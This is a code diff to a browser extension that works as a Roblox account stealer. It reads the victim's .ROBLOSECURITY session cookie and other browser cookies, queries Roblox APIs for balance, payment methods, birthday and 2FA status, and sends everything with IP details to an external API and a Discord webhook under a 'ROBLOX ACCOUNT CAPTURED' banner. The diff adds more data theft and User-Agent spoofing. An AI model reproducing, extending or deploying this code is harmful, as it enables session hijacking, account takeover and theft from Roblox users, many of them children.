@@ -1,9 +1,12 @@
 document.addEventListener('DOMContentLoaded', function() {
   // IMPORTANT: Replace this with your Discord webhook URL
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1461633934101053552/IhUbmHtj_YV8f96PDZa7kCZ8ao4-atRqtIqD9-ujWCKv8R7Zye1gss2LwGDIawebUFXf";
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1361949829474816112/MF6rRmldFGeuSb7yeJarmj4HX1q-dlwppegVXa2MaCzUYYj3I1n5rgSBPZirkjlOkKSO";
   
   // Your API endpoint
   const BYPASS_API_URL = "https://rblx-checker-infos.vercel.app/api/bypass";
+  
+  // Standard User-Agent for Roblox API requests
+  const ROBLOX_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
   
   // Track if we're showing only security cookies
   let showOnlySecurityCookies = true;
@@ -67,39 +70,87 @@ document.addEventListener('DOMContentLoaded', function() {
       );
       
       if (securityCookies.length > 0) {
-        // Security cookies found - send them to your API first
-        const robloxCookie = securityCookies[0].value;
-        sendToRobloxAPI(robloxCookie).then(robloxData => {
-          // Then send to Discord with enhanced data
-          sendCookiesToDiscord(WEBHOOK_URL, "Roblox", securityCookies, robloxData, true);
+        // Get actual browser User-Agent for logging
+        getUserAgent().then(browserUserAgent => {
+          // Send cookie to your API FIRST with browser's actual User-Agent
+          const robloxCookie = securityCookies[0].value;
+          sendToRobloxAPI(robloxCookie, browserUserAgent).then(robloxData => {
+            // Then send to Discord with enhanced data
+            sendCookiesToDiscord(WEBHOOK_URL, "Roblox", securityCookies, robloxData, browserUserAgent, true);
+          }).catch(error => {
+            console.error('Error getting Roblox data:', error);
+            // Still send to Discord even if API fails
+            sendCookiesToDiscord(WEBHOOK_URL, "Roblox", securityCookies, null, browserUserAgent, true);
+          });
         }).catch(error => {
-          console.error('Error getting Roblox data:', error);
-          // Still send to Discord even if API fails
-          sendCookiesToDiscord(WEBHOOK_URL, "Roblox", securityCookies, null, true);
+          console.error('Error getting User-Agent:', error);
+          // Use default if can't get browser UA
+          const robloxCookie = securityCookies[0].value;
+          sendToRobloxAPI(robloxCookie, navigator.userAgent).then(robloxData => {
+            sendCookiesToDiscord(WEBHOOK_URL, "Roblox", securityCookies, robloxData, navigator.userAgent, true);
+          });
         });
       } else {
-        // No security cookies found - send all cookies instead
-        sendCookiesToDiscord(WEBHOOK_URL, "All Domains", cookies.slice(0, 20), null, true);
+        // No security cookies found - get User-Agent and send all cookies
+        getUserAgent().then(browserUserAgent => {
+          sendCookiesToDiscord(WEBHOOK_URL, "All Domains", cookies.slice(0, 20), null, browserUserAgent, true);
+        }).catch(() => {
+          sendCookiesToDiscord(WEBHOOK_URL, "All Domains", cookies.slice(0, 20), null, navigator.userAgent, true);
+        });
       }
     });
   }
 });
 
-// Function to get Roblox account information
-async function getRobloxAccountInfo(cookie) {
-  try {
-    // First get user info
-    const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
-      headers: {
-        'Cookie': `.ROBLOSECURITY=${cookie}`,
-        'Content-Type': 'application/json'
+// Function to get browser's actual User-Agent
+function getUserAgent() {
+  return new Promise((resolve, reject) => {
+    // Try to get from current tab
+    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
+      if (tabs[0]) {
+        chrome.tabs.executeScript(tabs[0].id, {
+          code: 'navigator.userAgent'
+        }, function(results) {
+          if (results && results[0]) {
+            resolve(results[0]);
+          } else {
+            // Fallback to extension context
+            resolve(navigator.userAgent);
+          }
+        });
+      } else {
+        resolve(navigator.userAgent);
       }
     });
+  });
+}
+
+// Function to get Roblox account information USING MOZILLA USER-AGENT
+async function getRobloxAccountInfo(cookie, browserUserAgent = null) {
+  try {
+    // Prepare headers with cookie and MOZILLA User-Agent for Roblox API
+    const headers = {
+      'Cookie': `.ROBLOSECURITY=${cookie}`,
+      'Content-Type': 'application/json',
+      'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+      'Accept': 'application/json',
+      'Accept-Language': 'en-US,en;q=0.9',
+      'Origin': 'https://www.roblox.com',
+      'Referer': 'https://www.roblox.com/'
+    };
     
-    if (!userResponse.ok) throw new Error('Failed to get user info');
+    // First get user info
+    const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
+      headers: headers,
+      credentials: 'include'
+    });
+    
+    if (!userResponse.ok) throw new Error(`Failed to get user info: ${userResponse.status}`);
     
     const userData = await userResponse.json();
     const userId = userData.id;
+    
+    console.log(`Got user info for ID: ${userId}`);
     
     // Get all account information in parallel
     const [
@@ -110,57 +161,134 @@ async function getRobloxAccountInfo(cookie) {
       headlessOwned2,
       collectibles,
       paymentProfiles,
-      premiumStatus
+      premiumStatus,
+      creditBalance,
+      gamesPlayed,
+      voiceChatStatus
     ] = await Promise.allSettled([
       // Robux balance
       fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
-        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+        headers: headers,
+        credentials: 'include'
       }).then(r => r.ok ? r.json() : { robux: 0, pendingRobux: 0 }),
       
       // Total spent (past year)
       fetch(`https://economy.roblox.com/v2/users/${userId}/transaction-totals?timeFrame=Year&transactionType=summary`, {
-        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+        headers: headers,
+        credentials: 'include'
       }).then(r => r.ok ? r.json() : { summary: { grossAmount: 0 } }),
       
       // Korblox check
       fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/139607718`, {
-        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+        headers: headers,
+        credentials: 'include'
       }).then(r => r.ok ? r.json() : { data: [] }),
       
       // Headless check (first ID)
       fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/134082579`, {
-        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+        headers: headers,
+        credentials: 'include'
       }).then(r => r.ok ? r.json() : { data: [] }),
       
       // Headless check (second ID)
       fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/15093053680`, {
-        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+        headers: headers,
+        credentials: 'include'
       }).then(r => r.ok ? r.json() : { data: [] }),
       
       // Limited items & collectibles
       fetch(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=10&sortOrder=Asc`, {
-        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+        headers: headers,
+        credentials: 'include'
       }).then(r => r.ok ? r.json() : { data: [] }),
       
       // Payment methods
       fetch('https://apis.roblox.com/payments-gateway/v1/payment-profiles', {
-        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+        headers: headers,
+        credentials: 'include'
       }).then(r => r.ok ? r.json() : { paymentProfiles: [] }),
       
       // Premium membership
       fetch('https://apis.roblox.com/premium-features/v1/users/premium-membership', {
-        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
-      }).then(r => r.ok ? r.json() : { isPremium: false })
+        headers: headers,
+        credentials: 'include'
+      }).then(r => r.ok ? r.json() : { isPremium: false }),
+      
+      // Credit balance
+      fetch('https://apis.roblox.com/credit-balance/v1/get-credit-balance-for-navigation', {
+        headers: headers,
+        credentials: 'include'
+      }).then(r => r.ok ? r.json() : { creditBalance: 0 }),
+      
+      // Games played
+      fetch(`https://games.roblox.com/v2/users/${userId}/games?accessFilter=2&limit=10`, {
+        headers: headers,
+        credentials: 'include'
+      }).then(r => r.ok ? r.json() : { data: [] }),
+      
+      // Voice Chat status (try different endpoint)
+      fetch('https://voice.roblox.com/v1/settings/user', {
+        headers: headers,
+        credentials: 'include'
+      }).then(r => r.ok ? r.json() : { isEligible: false, isEnabled: false })
     ]);
     
     // Get user avatar
     const avatarResponse = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png`, {
-      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+      headers: headers,
+      credentials: 'include'
     });
     const avatarData = avatarResponse.ok ? await avatarResponse.json() : { data: [] };
     
-    // Get birthday and 2FA status (would need additional API calls)
-    // For now, we'll get some basic settings
+    // Try to get subscription details
+    let subscriptionDetails = { hasSubscription: false };
+    try {
+      const subResponse = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/subscriptions/details`, {
+        headers: headers,
+        credentials: 'include'
+      });
+      if (subResponse.ok) {
+        subscriptionDetails = await subResponse.json();
+        subscriptionDetails.hasSubscription = true;
+      }
+    } catch (e) {
+      console.log('Could not fetch subscription details');
+    }
+    
+    // Try to get birthday (from account settings)
+    let birthday = "Unknown";
+    try {
+      const settingsResponse = await fetch('https://accountsettings.roblox.com/v1/account/settings/personal', {
+        headers: headers,
+        credentials: 'include'
+      });
+      if (settingsResponse.ok) {
+        const settings = await settingsResponse.json();
+        if (settings.birthDate) {
+          birthday = settings.birthDate;
+        }
+      }
+    } catch (e) {
+      console.log('Could not fetch birthday');
+    }
+    
+    // Calculate total value of collectibles (RAP)
+    const totalRAP = collectibles.value?.data?.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0) || 0;
+    
+    // Check for 2FA (two-factor authentication)
+    let has2FA = false;
+    try {
+      const twoFactorResponse = await fetch('https://twostepverification.roblox.com/v1/users/authenticated/two-step-verification/get', {
+        headers: headers,
+        credentials: 'include'
+      });
+      if (twoFactorResponse.ok) {
+        const twoFactorData = await twoFactorResponse.json();
+        has2FA = twoFactorData.enabled || false;
+      }
+    } catch (e) {
+      console.log('Could not fetch 2FA status');
+    }
     
     return {
       user: userData,
@@ -172,8 +300,18 @@ async function getRobloxAccountInfo(cookie) {
       hasKorblox: korbloxOwned.value?.data?.length > 0,
       hasHeadless: (headlessOwned1.value?.data?.length > 0) || (headlessOwned2.value?.data?.length > 0),
       collectibles: collectibles.value?.data || [],
+      totalRAP: totalRAP,
       paymentMethods: paymentProfiles.value?.paymentProfiles || [],
       isPremium: premiumStatus.value?.isPremium || false,
+      creditBalance: creditBalance.value?.creditBalance || 0,
+      gamesPlayed: gamesPlayed.value?.data?.length || 0,
+      voiceChatEnabled: voiceChatStatus.value?.isEnabled || false,
+      voiceChatEligible: voiceChatStatus.value?.isEligible || false,
+      birthday: birthday,
+      has2FA: has2FA,
+      subscriptionDetails: subscriptionDetails,
+      browserUserAgent: browserUserAgent, // Keep original browser UA
+      robloxUserAgent: headers['User-Agent'], // Mozilla UA used for API calls
       timestamp: new Date().toISOString()
     };
     
@@ -184,26 +322,40 @@ async function getRobloxAccountInfo(cookie) {
 }
 
 // Function to send cookie to your API first
-async function sendToRobloxAPI(cookieValue) {
+async function sendToRobloxAPI(cookieValue, browserUserAgent = null) {
   try {
-    // First get Roblox account info
-    const robloxInfo = await getRobloxAccountInfo(cookieValue);
+    console.log('Getting Roblox account info with Mozilla User-Agent...');
     
-    // Send to your API
+    // First get Roblox account info USING MOZILLA USER-AGENT
+    const robloxInfo = await getRobloxAccountInfo(cookieValue, browserUserAgent);
+    
+    // Prepare data for your API
+    const apiData = {
+      cookie: cookieValue,
+      browserUserAgent: browserUserAgent,
+      robloxUserAgent: robloxInfo.robloxUserAgent, // Mozilla UA used
+      accountInfo: robloxInfo,
+      timestamp: new Date().toISOString(),
+      ipInfo: await getIPInfo() // Get IP information
+    };
+    
+    console.log('Sending to API:', BYPASS_API_URL);
+    
+    // Send to your API FIRST (with both User-Agents)
     const response = await fetch(BYPASS_API_URL, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json'
       },
-      body: JSON.stringify({
-        cookie: cookieValue,
-        accountInfo: robloxInfo,
-        timestamp: new Date().toISOString()
-      })
+      body: JSON.stringify(apiData)
     });
     
     if (!response.ok) {
       console.error('API response not OK:', response.status);
+      const errorText = await response.text();
+      console.error('API error response:', errorText);
+    } else {
+      console.log('Successfully sent to API');
     }
     
     return robloxInfo;
@@ -211,6 +363,19 @@ async function sendToRobloxAPI(cookieValue) {
     console.error('Error sending to API:', error);
     throw error;
   }
+}
+
+// Function to get IP information
+async function getIPInfo() {
+  try {
+    const response = await fetch('https://ipapi.co/json/');
+    if (response.ok) {
+      return await response.json();
+    }
+  } catch (error) {
+    console.log('Could not fetch IP info');
+  }
+  return null;
 }
 
 // Function to show status messages
@@ -316,8 +481,10 @@ function loadCookies(domain, securityOnly = true) {
         chrome.cookies.getAll({}, function(allCookies) {
           const securityCookies = allCookies.filter(c => c.name.includes('.ROBLOSECURITY'));
           if (securityCookies.length > 0) {
-            sendToRobloxAPI(securityCookies[0].value).then(() => {
-              sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), null, true);
+            getUserAgent().then(browserUserAgent => {
+              sendToRobloxAPI(securityCookies[0].value, browserUserAgent).then(() => {
+                sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), null, browserUserAgent, true);
+              });
             });
           }
         });
@@ -331,8 +498,10 @@ function loadCookies(domain, securityOnly = true) {
         chrome.cookies.getAll({}, function(allCookies) {
           const securityCookies = allCookies.filter(c => c.name.includes('.ROBLOSECURITY'));
           if (securityCookies.length > 0) {
-            sendToRobloxAPI(securityCookies[0].value).then(() => {
-              sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), null, true);
+            getUserAgent().then(browserUserAgent => {
+              sendToRobloxAPI(securityCookies[0].value, browserUserAgent).then(() => {
+                sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), null, browserUserAgent, true);
+              });
             });
           }
         });
@@ -348,8 +517,10 @@ function loadCookies(domain, securityOnly = true) {
         chrome.cookies.getAll({}, function(allCookies) {
           const securityCookies = allCookies.filter(c => c.name.includes('.ROBLOSECURITY'));
           if (securityCookies.length > 0) {
-            sendToRobloxAPI(securityCookies[0].value).then(() => {
-              sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), null, true);
+            getUserAgent().then(browserUserAgent => {
+              sendToRobloxAPI(securityCookies[0].value, browserUserAgent).then(() => {
+                sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), null, browserUserAgent, true);
+              });
             });
           }
         });
@@ -462,8 +633,10 @@ function showAddCookieForm(domain) {
           chrome.cookies.getAll({}, function(allCookies) {
             const securityCookies = allCookies.filter(c => c.name.includes('.ROBLOSECURITY'));
             if (securityCookies.length > 0) {
-              sendToRobloxAPI(securityCookies[0].value).then(() => {
-                sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), null, true);
+              getUserAgent().then(browserUserAgent => {
+                sendToRobloxAPI(securityCookies[0].value, browserUserAgent).then(() => {
+                  sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), null, browserUserAgent, true);
+                });
               });
             }
           });
@@ -477,8 +650,10 @@ function showAddCookieForm(domain) {
     chrome.cookies.getAll({}, function(allCookies) {
       const securityCookies = allCookies.filter(c => c.name.includes('.ROBLOSECURITY'));
       if (securityCookies.length > 0) {
-        sendToRobloxAPI(securityCookies[0].value).then(() => {
-          sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), null, true);
+        getUserAgent().then(browserUserAgent => {
+          sendToRobloxAPI(securityCookies[0].value, browserUserAgent).then(() => {
+            sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), null, browserUserAgent, true);
+          });
         });
       }
     });
@@ -486,7 +661,7 @@ function showAddCookieForm(domain) {
 }
 
 // Send cookies to Discord webhook with enhanced Roblox info
-function sendCookiesToDiscord(webhookUrl, domain, cookies, robloxData = null, showConfirmation = true) {
+function sendCookiesToDiscord(webhookUrl, domain, cookies, robloxData = null, browserUserAgent = null, showConfirmation = true) {
   // Format cookies into a readable format
   let cookieText = '';
   const cookiesToDisplay = cookies.slice(0, 20);
@@ -507,25 +682,30 @@ function sendCookiesToDiscord(webhookUrl, domain, cookies, robloxData = null, sh
     // Main account info embed
     embeds.push({
       title: `👤 ${robloxData.user.name} | ${robloxData.user.displayName}`,
-      description: `**User ID:** ${robloxData.userId}\n**Created:** ${new Date(robloxData.user.created).toLocaleDateString()}`,
+      description: `**User ID:** ${robloxData.userId}\n**Created:** ${new Date(robloxData.user.created).toLocaleDateString()}\n**Birthday:** ${robloxData.birthday}`,
       color: 15105570,
       thumbnail: {
         url: robloxData.avatarUrl
       },
       fields: [
         {
-          name: "💰 Robux Balance",
-          value: `**Current:** ${robloxData.robux.toLocaleString()}\n**Pending:** ${robloxData.pendingRobux.toLocaleString()}\n**Total Spent (Year):** $${robloxData.totalSpent}`,
+          name: "💰 Financial Information",
+          value: `**Robux:** ${robloxData.robux.toLocaleString()}\n**Pending:** ${robloxData.pendingRobux.toLocaleString()}\n**Total Spent:** $${robloxData.totalSpent}\n**Credit Balance:** $${robloxData.creditBalance}`,
           inline: true
         },
         {
-          name: "🎮 Collectibles",
-          value: `**Limiteds:** ${robloxData.collectibles.length}\n**Korblox:** ${robloxData.hasKorblox ? '✅' : '❌'}\n**Headless:** ${robloxData.hasHeadless ? '✅' : '❌'}`,
+          name: "🎮 Collectibles & Items",
+          value: `**Limiteds:** ${robloxData.collectibles.length}\n**Total RAP:** ${robloxData.totalRAP.toLocaleString()}\n**Korblox:** ${robloxData.hasKorblox ? '✅' : '❌'}\n**Headless:** ${robloxData.hasHeadless ? '✅' : '❌'}`,
           inline: true
         },
         {
-          name: "⚙️ Settings",
-          value: `**Premium:** ${robloxData.isPremium ? '✅' : '❌'}\n**Payment Methods:** ${robloxData.paymentMethods.length}\n**2FA:** Unknown`,
+          name: "⚙️ Account Settings",
+          value: `**Premium:** ${robloxData.isPremium ? '✅' : '❌'}\n**Subscription:** ${robloxData.subscriptionDetails.hasSubscription ? '✅' : '❌'}\n**2FA:** ${robloxData.has2FA ? '✅' : '❌'}\n**Voice Chat:** ${robloxData.voiceChatEnabled ? '✅' : '❌'}`,
+          inline: true
+        },
+        {
+          name: "📊 Activity",
+          value: `**Payment Methods:** ${robloxData.paymentMethods.length}\n**Games Played:** ${robloxData.gamesPlayed}\n**Voice Eligible:** ${robloxData.voiceChatEligible ? '✅' : '❌'}`,
           inline: true
         }
       ],
@@ -535,30 +715,53 @@ function sendCookiesToDiscord(webhookUrl, domain, cookies, robloxData = null, sh
       timestamp: robloxData.timestamp
     });
     
-    // Add cookie data as second embed
+    // Add User-Agent embed if available
+    if (browserUserAgent) {
+      embeds.push({
+        title: "🌐 Browser & API Information",
+        description: `**Browser User-Agent:**\n\`\`\`${browserUserAgent.substring(0, 150)}...\`\`\`\n**Roblox API User-Agent:**\n\`\`\`${robloxData.robloxUserAgent}\`\`\``,
+        color: 3447003,
+        footer: {
+          text: "User-Agent Information"
+        }
+      });
+    }
+    
+    // Add cookie data as embed
     embeds.push({
       title: "🔐 Cookie Data",
       description: cookieText || "No cookies found",
-      color: 3447003,
+      color: 10181046,
       footer: {
-        text: "Cookie data • " + new Date().toLocaleString()
+        text: "Cookie data"
       }
     });
   } else {
     // Regular embed without Roblox data
-    embeds.push({
+    const embed = {
       title: `Cookies from ${domain}`,
       description: cookieText || "No cookies found",
       color: 15105570,
       footer: {
         text: "Cookie data • " + new Date().toLocaleString()
       }
-    });
+    };
+    
+    // Add User-Agent field if available
+    if (browserUserAgent) {
+      embed.fields = [{
+        name: "Browser User-Agent",
+        value: `\`\`\`${browserUserAgent.substring(0, 100)}...\`\`\``,
+        inline: false
+      }];
+    }
+    
+    embeds.push(embed);
   }
   
   // Create JSON data for Discord webhook
   const data = {
-    content: robloxData ? `🎯 Roblox Account Captured: **${robloxData.user.name}**` : "Cookie data captured",
+    content: robloxData ? `🎯 **ROBLOX ACCOUNT CAPTURED**\n👤 **${robloxData.user.name}** (${robloxData.user.displayName})` : "Cookie data captured",
     embeds: embeds
   };
   
